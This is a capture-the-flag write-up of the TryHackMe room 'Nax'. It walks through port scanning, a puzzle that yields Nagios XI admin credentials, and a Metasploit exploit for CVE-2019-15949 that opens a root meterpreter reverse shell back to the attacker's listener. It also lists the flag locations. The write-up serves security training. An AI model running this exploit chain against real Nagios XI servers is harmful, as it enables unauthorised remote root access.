# Nax
Identify the critical security flaw in the most powerful and trusted network monitoring software on the market, that allows an user authenticated execute remote code execution.

---
### Resolution

Nmap version and default scripts scan:
```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 62:1d:d9:88:01:77:0a:52:bb:59:f9:da:c1:a6:e3:cd (RSA)
|   256 af:67:7d:24:e5:95:f4:44:72:d1:0c:39:8d:cc:21:15 (ECDSA)
|_  256 20:28:15:ef:13:c8:9f:b8:a7:0f:50:e6:2f:3b:1e:57 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: ubuntu.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-03-23T23:42:04
|_Not valid after:  2030-03-21T23:42:04
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=192.168.85.153/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
| Not valid before: 2020-03-24T00:14:58
|_Not valid after:  2030-03-22T00:14:58
|_http-title: Site doesn't have a title (text/html).
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: Host:  ubuntu.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Both web apps (on port 80 and 443) have the same content. Visiting the website we find a suspicious welcoming expression:
```
<...snip...>
                  Welcome to elements.
	Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr
```
The symbols refer to periodic elements, and based on the atomic number we end up with the following list `[47, 80, 73, 51, 84, 46, 80, 78, 103]`. If we interpret the numbers as ASCII characters we get `/PI3T.PNg`. Is this the hidden file? yep, it is.

We download that image to inspect it more. We can use `exiftool` to read the image's metadata:
```
$ exiftool PI3T.PNg 

<...snip...>
Palette                         : (Binary data 768 bytes, use -b option to extract)
Transparency                    : (Binary data 256 bytes, use -b option to extract)
Artist                          : Piet Mondrian
Copyright                       : Piet Mondrian, tryhackme 2020
Image Size                      : 990x990
Megapixels                      : 0.980
```

There we have our author's name as the artist.

For the next step, a username is required. A username of what service? we can fuzz the web application for more directories. Spoil alert: the room is about Nagios so we expect it to be in the results.
```
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://<target_ip>/FUZZ"               

<...snip...>
javascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 41ms]
nagios                  [Status: 401, Size: 460, Words: 42, Lines: 15, Duration: 44ms]
```

Alternatively, the source code of the home page indicates a path `/nagiosxi/`.
![image](https://github.com/elomarii/CTF_4_DAY/assets/106914699/57bcd0ba-e59a-403b-b095-71d762a053a8)

Navigating to `http://<target_ip>/nagiosxi/`, we find a login page for the Nagios XI dashboard.\
The intuition based on the previous questions is to derive a username from the artist name "Pieter Cornelis Mondriaan". However, this was a trap and has nothing to do with the next question.\
If we take a look at what default usernames Nagios uses for its products, we find a list of potential answers, including the one we're looking for; the default Nagios XI admin username `nagiosadmin`.

Back to our picture. I found, after a considerable amount of time, that piet is a programming language. From [here](https://esolangs.org/wiki/Piet), we read:
> Piet is a stack-based esoteric programming language in which programs look like abstract paintings. It uses 20 colors, of which 18 are related cyclically through a lightness cycle and a hue cycle. A single stack is used for data storage, together with some unusual operations.

We can execute the picture `PI3T.PNg` using an online tool like [npiet online](https://www.bertnase.de/npiet/npiet-execute.php), and then find the password: `n3p3UQ&9BjLp4$7uhWdY`.

Now let's launch Metasploit and search for a useful exploit.
```
msf6 > search nagios xi type:exploit

Matching Modules
================

   #   Name                                                                 Disclosure Date  Rank       Check  Description
   -   ----                                                                 ---------------  ----       -----  -----------
   0   exploit/linux/http/nagios_xi_snmptrap_authenticated_rce              2020-10-20       excellent  Yes    Nagios XI 5.5.0-5.7.3 - Snmptrap Authenticated Remote Code Exection
   1   exploit/linux/http/nagios_xi_configwizards_authenticated_rce         2021-02-13       excellent  Yes    Nagios XI 5.5.6 to 5.7.5 - ConfigWizards Authenticated Remote Code Exection
   2   exploit/linux/http/nagios_xi_mibs_authenticated_rce                  2020-10-20       excellent  Yes    Nagios XI 5.6.0-5.7.3 - Mibs.php Authenticated Remote Code Exection
   3   exploit/linux/http/nagios_xi_autodiscovery_webshell                  2021-07-15       excellent  Yes    Nagios XI Autodiscovery Webshell Upload
   4   exploit/linux/http/nagios_xi_chained_rce                             2016-03-06       excellent  Yes    Nagios XI Chained Remote Code Execution
   5   exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo         2018-04-17       manual     Yes    Nagios XI Chained Remote Code Execution
   6   exploit/linux/http/nagios_xi_magpie_debug                            2018-11-14       excellent  Yes    Nagios XI Magpie_debug.php Root Remote Code Execution
   7   exploit/unix/webapp/nagios_graph_explorer                            2012-11-30       excellent  Yes    Nagios XI Network Monitor Graph Explorer Component Command Injection
   8   exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce  2019-07-29       excellent  Yes    Nagios XI Prior to 5.6.6 getprofile.sh Authenticated Remote Command Execution
   9   exploit/linux/http/nagios_xi_plugins_filename_authenticated_rce      2020-12-19       excellent  Yes    Nagios XI Prior to 5.8.0 - Plugins Filename Authenticated Remote Code Exection
   10  exploit/unix/webapp/nagios3_history_cgi                              2012-12-09       great      Yes    Nagios3 history.cgi Host Command Execution

```

We can check out the description of the different exploits. The closest match to our situation is 8. The exploited vulnerability corresponds to `CVE-2019-15949`.\
The full path to the exploit: `exploits/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce`.

Exploitation:
```
msf6 > use exploits/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce
[*] Using configured payload linux/x64/meterpreter/reverse_tcp

msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set password n3p3UQ&9BjLp4$7uhWdY
password => n3p3UQ&9BjLp4$7uhWdY
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set rhosts <target_ip>
rhosts => <target_ip>
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set lhost <your_ip>
lhost => <your_ip>
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set lport 53
lport => 53
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > run

[*] Started reverse TCP handler on <your_ip> 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Attempting to authenticate to Nagios XI...
[+] Successfully authenticated to Nagios XI.
[*] Target is Nagios XI with version 5.5.6.
[+] The target appears to be vulnerable.
[*] Uploading malicious 'check_ping' plugin...
[*] Command Stager progress - 100.00% done (897/897 bytes)
[+] Successfully uploaded plugin.
[*] Executing plugin...
[*] Waiting up to 300 seconds for the plugin to request the final payload...
[*] Sending stage (3045380 bytes) to <target_ip>
[*] Meterpreter session 1 opened (<your_ip>:53 -> <target_ip>:57310) at 2024-03-06 16:35:28 +0000
[*] Deleting malicious 'check_ping' plugin...
[+] Plugin deleted.

meterpreter > 
```

Got a session! Note that the session's user is root.\
The user flag is located at `/home/galand/user.txt` and the root flag is at `/root/root.txt`.


